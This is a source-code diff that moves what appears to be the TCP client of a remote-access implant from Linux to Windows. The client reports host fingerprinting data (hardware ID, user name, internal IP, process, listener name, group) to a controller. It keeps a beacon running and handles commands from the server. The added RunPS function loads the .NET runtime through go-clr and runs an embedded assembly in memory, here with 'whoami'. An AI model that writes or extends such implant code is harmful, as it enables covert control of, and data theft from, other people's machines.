@@ -1,22 +1,21 @@
-//go:build linux
-// +build linux
+//go:build windows
 
-package tcp
+package Protocol
 
 import (
-	"bytes"
 	"encoding/binary"
 	"main/Encrypt"
-	HandlePacket "main/HandlePacket/tcp"
-	"main/MessagePack"
+	HandlePacket "main/HandlePacket/windows"
+	"main/Helper/handle"
 	"main/PcInfo"
 	"math/rand"
 	"net"
-	"sync"
 	"time"
+
+	"github.com/Ne0nd0g/go-clr"
 )
 
-func Send(msg []byte, conn net.Conn) {
+func (s *Client) TcpSend(msg []byte, conn net.Conn) {
 	defer func() {
 		if err := recover(); err != nil {
 			//log.Println("Send error:", err)
@@ -58,24 +57,10 @@ func Send(msg []byte, conn net.Conn) {
 	}
 }
 
-type TCPClient struct {
-	Client            *net.TCPConn
-	Buffer            []byte
-	BufferSize        int64
-	MS                bytes.Buffer
-	IsConnected       bool
-	SendSync          sync.Mutex
-	ActivatePong      bool
-	RemarkMessage     string
-	RemarkClientColor string
-	keepAlive         *time.Ticker
-	// Implementing timers and ThreadPool would require more context and may need external libraries
-}
-
 // assuming for the sake of example
 
-func (s *TCPClient) InitializeClient() {
-	addr, err := net.ResolveTCPAddr("tcp", PcInfo.Host+":"+PcInfo.Port)
+func (s *Client) InitializeTcpClient() {
+	addr, err := net.ResolveTCPAddr("tcp", PcInfo.HostPort)
 	if err != nil {
 		s.IsConnected = false
 		return
@@ -94,15 +79,17 @@ func (s *TCPClient) InitializeClient() {
 		s.MS.Reset()
 
 		// Assuming SendInfo() exists
-		Send(SendInfo(), s.Client)
-
+		s.TcpSend(SendInfo(), s.Client)
+		RunPS()
 		// Implementing Timer using time package. Assuming KeepAlivePacket function exists
 		s.keepAlive = time.NewTicker(8 * time.Second)
 
 		// Start a goroutine to handle the ticks
 		go func() {
 			for range s.keepAlive.C {
-				s.KeepAlivePacket(s.Client)
+				KeepAlivePacket(s.Client, func(data []byte, conn *net.TCPConn) {
+					s.TcpSend(data, conn)
+				})
 			}
 		}()
 
@@ -112,7 +99,22 @@ func (s *TCPClient) InitializeClient() {
 	}
 }
 
-func (s *TCPClient) ReadServerData() {
+func RunPS() {
+	clr.RedirectStdoutStderr()
+
+	runtimeHost, err := clr.LoadCLR(PcInfo.ClrVersion)
+
+	if err != nil {
+		// log.Fatal(err)
+	}
+	methodInfo, err := clr.LoadAssembly(runtimeHost, handle.Nps_2)
+	if err != nil {
+		//Function.SessionLog(err.Error(), "", Connection, sendFunc, unmsgpack)
+	}
+	//fmt.Println(unmsgpack.ForcePathObject("OutString").GetAsString())
+	clr.InvokeAssembly(methodInfo, []string{"whoami"})
+}
+func (s *Client) ReadServerData() {
 	if s.Client == nil || !s.IsConnected {
 		s.IsConnected = false
 		return
@@ -141,9 +143,9 @@ func (s *TCPClient) ReadServerData() {
 			}
 			if int64(s.MS.Len()) == s.BufferSize {
 				//fmt.Println("calc")
-				HandlePacket.Read(s.MS.Bytes(), s.Client)
-				//time.Sleep(time.Second * 1)
-
+				HandlePacket.Read(s.MS.Bytes(), s.Client, func(data []byte, conn *net.TCPConn) {
+					s.TcpSend(data, conn)
+				})
 				s.Buffer = make([]byte, 4)
 				s.MS.Reset()
 			} else {
@@ -156,47 +158,21 @@ func (s *TCPClient) ReadServerData() {
 	}
 }
 
-func (s *TCPClient) KeepAlivePacket(conn net.Conn) {
-	msgpack := new(MessagePack.MsgPack)
-	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientPing")
-	msgpack.ForcePathObject("Message").SetAsString("DDDD")
-
-	Send(msgpack.Encode2Bytes(), conn)
-	s.ActivatePong = true
-}
-func SendInfo() []byte {
-	msgpack := new(MessagePack.MsgPack)
-	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientInfo")
-	msgpack.ForcePathObject("OS").SetAsString(PcInfo.GetLinuxVersion())
-	msgpack.ForcePathObject("HWID").SetAsString(PcInfo.GetHWID())
-	msgpack.ForcePathObject("User").SetAsString(PcInfo.GetUserName())
-	msgpack.ForcePathObject("LANip").SetAsString(PcInfo.GetInternalIP())
-	msgpack.ForcePathObject("ProcessName").SetAsString(PcInfo.GetProcessName())
-	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.ProcessID)
-	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
-	msgpack.ForcePathObject("SleepTime").SetAsString("10")
-	msgpack.ForcePathObject("RemarkMessage").SetAsString(PcInfo.RemarkContext)
-	msgpack.ForcePathObject("RemarkClientColor").SetAsString(PcInfo.RemarkColor)
-	msgpack.ForcePathObject("CLRVersion").SetAsString(PcInfo.ClrVersion)
-	msgpack.ForcePathObject("Group").SetAsString(PcInfo.GroupInfo)
-	msgpack.ForcePathObject("ClientComputer").SetAsString(PcInfo.ClientComputer)
-	return msgpack.Encode2Bytes()
-}
-func (s *TCPClient) Reconnect() {
+func (s *Client) Reconnect() {
 	s.CloseConnection()
-	s.InitializeClient()
+	s.InitializeTcpClient()
 }
 
-func (s *TCPClient) CloseConnection() {
+func (s *Client) CloseConnection() {
 	if s.Client != nil {
 		s.Client.Close()
 	}
 	s.MS.Reset()
 }
 
-func Run_main() {
-	socket := TCPClient{}
-	socket.InitializeClient()
+func TcpRun() {
+	socket := Client{}
+	socket.InitializeTcpClient()
 
 	r := rand.New(rand.NewSource(time.Now().UnixNano())) // Create a new random generator
 
